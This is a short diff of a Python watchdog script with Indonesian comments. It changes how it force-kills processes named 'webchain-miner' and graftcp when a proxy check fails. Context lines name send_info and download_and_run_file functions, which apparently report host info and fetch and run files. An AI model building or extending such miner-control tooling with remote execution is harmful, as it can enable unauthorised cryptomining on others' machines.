@@ -27,7 +27,10 @@ def check_proxy():
         return False
 
 def kill_processes(process_list):
-    subprocess.run(['pkill', '-9'] + process_list)
+    # Menggabungkan daftar proses menjadi satu string dengan pemisah "|"
+    process_string = "|".join(process_list)
+    # Menjalankan perintah pkill dengan opsi -f untuk mencocokkan semua pola sekaligus
+    subprocess.run(['pkill', '-9', '-f', process_string])
 
 def read_from_file():
     file_name = '../info.txt'
@@ -75,7 +78,7 @@ def download_and_run_file():
         print(f"Error downloading/running file: {e}")
 
 if __name__ == "__main__":
-    process_list = ['webchain-miner', 'gas', 'graftcp', 'graftcp-local', 'me.py']
+    process_list = ['webchain-miner', 'gas', 'graftcp', 'graftcp-local']
     
     while True:
         if check_proxy():
@@ -83,7 +86,10 @@ if __name__ == "__main__":
             time.sleep(300)
         else:
             print("Proxy tidak valid. Menghentikan proses.")
-            kill_processes(process_list)
+            try:
+                kill_processes(process_list)
+            except Exception as px:
+                print(f"Error saat pkill: {px}")
 
             try:
                 send_info()
